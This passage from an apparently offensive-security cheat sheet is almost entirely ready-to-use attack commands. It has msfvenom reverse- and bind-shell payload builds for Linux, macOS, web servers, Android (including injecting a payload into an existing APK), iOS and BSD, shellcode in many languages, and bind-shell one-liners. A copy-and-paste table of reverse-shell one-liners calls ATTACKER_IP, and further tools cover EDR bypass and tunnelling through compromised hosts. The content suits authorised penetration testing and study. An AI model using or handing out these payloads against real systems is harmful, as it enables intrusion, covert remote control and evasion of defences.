  msfvenom -p linux/armle/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_arm.elf
  ```

  ```bash [Linux ARM — Raw Shell]
  msfvenom -p linux/armle/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_arm_raw.elf
  ```

  ```bash [Linux ARM64 (aarch64)]
  msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_arm64.elf
  ```

  ```bash [Linux MIPS (Routers)]
  msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_mips.elf
  ```

  ```bash [Linux MIPS Big Endian]
  msfvenom -p linux/mipsbe/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_mipsbe.elf
  ```
::

### macOS Payloads

::code-group
  ```bash [macOS x64 — Meterpreter Stageless]
  msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f macho -o shell.macho
  ```

  ```bash [macOS x64 — Raw Shell]
  msfvenom -p osx/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f macho -o shell_raw.macho
  ```

  ```bash [macOS x64 — Meterpreter HTTPS]
  msfvenom -p osx/x64/meterpreter_reverse_https LHOST=ATTACKER_IP LPORT=443 -f macho -o shell_https.macho
  ```
::

### Web Payloads

::code-group
  ```bash [PHP — Meterpreter]
  msfvenom -p php/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.php
  ```

  ```bash [PHP — Meterpreter HTTPS]
  msfvenom -p php/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -f raw -o shell_https.php
  ```

  ```bash [ASP — Meterpreter]
  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f asp -o shell.asp
  ```

  ```bash [ASPX — Meterpreter x64]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f aspx -o shell.aspx
  ```

  ```bash [JSP — Shell]
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell.jsp
  ```

  ```bash [JSP — Meterpreter]
  msfvenom -p java/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw -o shell_met.jsp
  ```

  ```bash [WAR — Shell (Tomcat)]
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war -o shell.war
  ```

  ```bash [WAR — Meterpreter (Tomcat)]
  msfvenom -p java/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f war -o shell_met.war
  ```

  ```bash [Node.js]
  msfvenom -p nodejs/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -o shell.js
  ```
::

### Shellcode Formats

::code-group
  ```bash [C Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f c -b '\x00'
  ```

  ```bash [C# Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f csharp -b '\x00'
  ```

  ```bash [Python Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f python -b '\x00'
  ```

  ```bash [Ruby Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f ruby -b '\x00'
  ```

  ```bash [Perl Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f perl -b '\x00'
  ```

  ```bash [Java Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f java
  ```

  ```bash [JavaScript Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f js_le -b '\x00'
  ```

  ```bash [PowerShell Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f ps1
  ```

  ```bash [Raw Binary]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f raw -o shellcode.bin
  ```

  ```bash [Hex String]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f hex
  ```

  ```bash [Base64]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f base64
  ```

  ```bash [Bash Format]
  msfvenom -p linux/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f bash
  ```

  ```bash [Nim Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f nim
  ```

  ```bash [Go Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f go
  ```

  ```bash [Rust Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f rust
  ```

  ```bash [Delphi Format]
  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f delphi
  ```
::

### Android Payloads

::code-group
  ```bash [Android — Meterpreter TCP]
  msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -o shell.apk
  ```

  ```bash [Android — Meterpreter HTTPS]
  msfvenom -p android/meterpreter/reverse_https LHOST=ATTACKER_IP LPORT=443 -o shell_https.apk
  ```

  ```bash [Android — Meterpreter HTTP]
  msfvenom -p android/meterpreter/reverse_http LHOST=ATTACKER_IP LPORT=80 -o shell_http.apk
  ```

  ```bash [Android — Inject into Existing APK]
  msfvenom -p android/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -x /path/to/original.apk -o trojan.apk
  ```
::

### Apple iOS Payloads

::code-group
  ```bash [iOS — Meterpreter TCP]
  msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f macho -o shell_ios.macho
  ```
::

### BSD Payloads

::code-group
  ```bash [FreeBSD x64 — Shell TCP]
  msfvenom -p bsd/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_bsd.elf
  ```

  ```bash [FreeBSD x86 — Shell TCP]
  msfvenom -p bsd/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_bsd32.elf
  ```

  ```bash [OpenBSD x86 — Shell TCP]
  msfvenom -p bsd/x86/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f elf -o shell_openbsd.elf
  ```
::

---

## Bind Shell Payloads

### One-Liners

::code-group
  ```bash [Bash Bind Shell]
  bash -c 'while true; do nc -lvnp PORT -e /bin/bash; done'
  ```

  ```bash [Netcat Bind Shell (-e)]
  nc -lvnp PORT -e /bin/bash
  ```

  ```bash [Netcat Bind Shell (no -e)]
  rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT > /tmp/f
  ```

  ```bash [Ncat Bind Shell]
  ncat -lvnp PORT -e /bin/bash
  ```

  ```bash [Ncat SSL Bind Shell]
  ncat --ssl --ssl-cert cert.pem --ssl-key key.pem -lvnp PORT -e /bin/bash
  ```

  ```bash [Socat Bind Shell]
  socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
  ```

  ```bash [Socat SSL Bind Shell]
  socat OPENSSL-LISTEN:PORT,cert=shell.pem,verify=0,reuseaddr,fork EXEC:/bin/bash,pty,stderr
  ```

  ```python [Python Bind Shell]
  python3 -c 'import socket,subprocess,os;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",PORT));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);subprocess.call(["/bin/sh","-i"])'
  ```

  ```php [PHP Bind Shell]
  php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",PORT);socket_listen($s,1);$cl=socket_accept($s);while(1){socket_write($cl,"$ ");$in=socket_read($cl,1024);$cmd=popen($in,"r");while(!feof($cmd)){$out=fgets($cmd);socket_write($cl,$out);}}'
  ```

  ```perl [Perl Bind Shell]
  perl -MIO -e '$s=new IO::Socket::INET(LocalPort,PORT,Listen,1,Reuse,1);while($c=$s->accept()){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'
  ```

  ```ruby [Ruby Bind Shell]
  ruby -rsocket -e 's=TCPServer.new("0.0.0.0",PORT);c=s.accept;while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
  ```

  ```powershell [PowerShell Bind Shell]
  powershell -nop -ep bypass -c "$l=New-Object Net.Sockets.TcpListener([Net.IPAddress]::Any,PORT);$l.Start();$c=$l.AcceptTcpClient();$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length)};$l.Stop()"
  ```
::

### msfvenom Bind Shells

::code-group
  ```bash [Windows x64 — Meterpreter Bind TCP]
  msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=PORT -f exe -o bind.exe
  ```

  ```bash [Windows x64 — Raw Shell Bind TCP]
  msfvenom -p windows/x64/shell_bind_tcp LPORT=PORT -f exe -o bind_raw.exe
  ```

  ```bash [Windows x86 — Meterpreter Bind TCP]
  msfvenom -p windows/meterpreter/bind_tcp LPORT=PORT -f exe -o bind32.exe
  ```

  ```bash [Linux x64 — Meterpreter Bind TCP]
  msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=PORT -f elf -o bind.elf
  ```

  ```bash [Linux x64 — Raw Shell Bind TCP]
  msfvenom -p linux/x64/shell_bind_tcp LPORT=PORT -f elf -o bind_raw.elf
  ```

  ```bash [Linux x86 — Meterpreter Bind TCP]
  msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=PORT -f elf -o bind32.elf
  ```

  ```bash [PHP — Bind PHP]
  msfvenom -p php/bind_php LPORT=PORT -f raw -o bind.php
  ```

  ```bash [Python — Bind TCP]
  msfvenom -p python/meterpreter/bind_tcp LPORT=PORT -o bind.py
  ```

  ```bash [Java — Bind TCP]
  msfvenom -p java/meterpreter/bind_tcp LPORT=PORT -f war -o bind.war
  ```

  ```bash [Android — Bind TCP]
  msfvenom -p android/meterpreter/bind_tcp LPORT=PORT -o bind.apk
  ```
::

---

## Payload Resources & Generators

### Online Generators

::card-group
  ::card
  ---
  title: RevShells.com
  icon: i-lucide-globe
  to: https://www.revshells.com
  target: _blank
  ---
  Interactive reverse shell generator. Select language, enter IP/port, copy payload. Supports 40+ languages with encoding options.
  ::

  ::card
  ---
  title: PayloadsAllTheThings
  icon: i-lucide-book-open
  to: https://github.com/swisskyrepo/PayloadsAllTheThings
  target: _blank
  ---
  Massive repository of payload examples for every vulnerability class — reverse shells, web shells, SQL injection, XSS, XXE, SSRF, and more.
  ::

  ::card
  ---
  title: HackTricks
  icon: i-lucide-lightbulb
  to: https://book.hacktricks.xyz/generic-methodologies-and-resources/shells
  target: _blank
  ---
  Comprehensive penetration testing methodology with shell payloads, privilege escalation techniques, and post-exploitation guides.
  ::

  ::card
  ---
  title: PentestMonkey Cheat Sheet
  icon: i-lucide-scroll-text
  to: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
  target: _blank
  ---
  The original reverse shell cheat sheet. Classic reference that started it all.
  ::
::

### Offline Tools

::card-group
  ::card
  ---
  title: msfvenom
  icon: i-lucide-package
  ---
  Metasploit's standalone payload generator. Supports 500+ payloads, 30+ formats, 20+ encoders, and template injection.

  ```bash
  msfvenom -l payloads | wc -l    # List all payloads
  msfvenom -l formats             # List all formats
  msfvenom -l encoders            # List all encoders
  ```
  ::

  ::card
  ---
  title: Shellcraft (pwntools)
  icon: i-lucide-wrench
  ---
  Python library for generating shellcode programmatically. Supports x86, x64, ARM, MIPS, and more.

  ```python
  from pwn import *
  shellcode = shellcraft.amd64.linux.sh()
  print(shellcode)
  ```
  ::

  ::card
  ---
  title: Donut
  icon: i-lucide-donut
  to: https://github.com/TheWover/donut
  target: _blank
  ---
  Generates position-independent shellcode from .NET assemblies, PE files, and DLLs. Bypass AMSI and ETW.

  ```bash
  donut -i payload.exe -o loader.bin
  ```
  ::

  ::card
  ---
  title: ScareCrow
  icon: i-lucide-ghost
  to: https://github.com/optiv/ScareCrow
  target: _blank
  ---
  Payload creation framework for EDR bypass. Generates payloads using Windows script hosts, DLL side-loading, and more.

  ```bash
  ScareCrow -I shellcode.bin -Loader dll -domain microsoft.com
  ```
  ::
::

### Wordlists & Default Credentials

::card-group
  ::card
  ---
  title: SecLists
  icon: i-lucide-list
  to: https://github.com/danielmiessler/SecLists
  target: _blank
  ---
  The ultimate collection of security-related lists — passwords, usernames, URLs, fuzzing payloads, web shells, and more.
  ::

  ::card
  ---
  title: Reverse Shell Generator Scripts
  icon: i-lucide-file-code
  to: https://github.com/mthbernardes/rsg
  target: _blank
  ---
  Command-line tool to generate reverse shells in multiple languages with your IP and port pre-filled.

  ```bash
  rsg ATTACKER_IP PORT python
  ```
  ::

  ::card
  ---
  title: Nishang (PowerShell)
  icon: i-lucide-terminal
  to: https://github.com/samratashok/nishang
  target: _blank
  ---
  PowerShell offensive security framework. Includes reverse shells, keyloggers, privilege escalation, and exfiltration scripts.
  ::

  ::card
  ---
  title: WebShell Collection
  icon: i-lucide-globe
  to: https://github.com/tennc/webshell
  target: _blank
  ---
  Massive collection of web shells in PHP, ASP, ASPX, JSP, and more. Includes obfuscated variants.
  ::
::

### Shell Upgrade & Stabilization Tools

::card-group
  ::card
  ---
  title: pwncat
  icon: i-lucide-cat
  to: https://github.com/calebstewart/pwncat
  target: _blank
  ---
  Automated reverse shell handler with auto-enumeration, file transfer, privilege escalation suggestions, and persistence.

  ```bash
  pwncat-cs -lp PORT
  ```
  ::

  ::card
  ---
  title: rlwrap
  icon: i-lucide-keyboard
  ---
  Wraps any command with readline support — gives you arrow keys, history, and tab completion on dumb shells.

  ```bash
  rlwrap nc -lvnp PORT
  ```
  ::

  ::card
  ---
  title: Chisel
  icon: i-lucide-route
  to: https://github.com/jpillora/chisel
  target: _blank
  ---
  TCP/UDP tunnel over HTTP. Create reverse SOCKS proxies and port forwards through firewalls.

  ```bash
  # Attacker
  chisel server -p 8080 --reverse
  # Target
  chisel client ATTACKER_IP:8080 R:socks
  ```
  ::

  ::card
  ---
  title: Ligolo-ng
  icon: i-lucide-network
  to: https://github.com/nicocha30/ligolo-ng
  target: _blank
  ---
  Advanced tunneling tool using TUN interfaces. Create VPN-like tunnels through compromised hosts.

  ```bash
  # Attacker
  ligolo-proxy -selfcert
  # Target
  ligolo-agent -connect ATTACKER_IP:11601 -ignore-cert
  ```
  ::
::

---

## Quick Copy Reference

::tip
Bookmark this section. These are the payloads you will use 90% of the time.
::

::collapsible

| Language | Reverse Shell Payload |
| -------- | --------------------- |
| **Bash** | `bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1` |
| **Bash (alt)** | `bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'` |
| **Netcat (-e)** | `nc -e /bin/bash ATTACKER_IP PORT` |
| **Netcat (no -e)** | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc ATTACKER_IP PORT>/tmp/f` |
| **Python 3** | `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'` |
| **Python 3 PTY** | `python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'` |
| **PHP** | `php -r '$s=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'` |
| **Perl** | `perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'` |
| **Ruby** | `ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",PORT).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` |
| **Node.js** | `require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1')` |
| **PowerShell** | `powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',PORT);..."` |
| **Socat** | `socat TCP:ATTACKER_IP:PORT EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` |
| **Socat SSL** | `socat OPENSSL:ATTACKER_IP:PORT,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane` |
| **OpenSSL** | `mkfifo /tmp/s;/bin/sh -i</tmp/s 2>&1\|openssl s_client -quiet -connect ATTACKER_IP:PORT>/tmp/s;rm /tmp/s` |
| **Lua** | `lua -e "require('socket');require('os');t=socket.tcp();t:connect('ATTACKER_IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"` |
| **AWK** | `awk 'BEGIN{s="/inet/tcp/0/ATTACKER_IP/PORT";while(42){do{printf "$ "\|& s;s\|& getline c;if(c){while((c\|& getline)>0)print $0\|& s;close(c)}}while(c!="exit")close(s)}}'` |
| **Telnet** | `TF=$(mktemp -u);mkfifo $TF && telnet ATTACKER_IP PORT 0<$TF\|/bin/sh 1>$TF` |
| **Xterm** | `xterm -display ATTACKER_IP:1` |
| **msfvenom Win** | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o s.exe` |
| **msfvenom Lin** | `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf -o s.elf` |
| **msfvenom PHP** | `msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f raw -o s.php` |
| **msfvenom HTTPS** | `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o s.exe` |

::

::tip
**The single most important rule:** Start your listener BEFORE triggering the payload. A reverse shell with no listener is a wasted exploit.

```bash [Terminal]
nc -lvnp PORT
```

Then fire your payload. :icon{name="i-lucide-bomb"}
::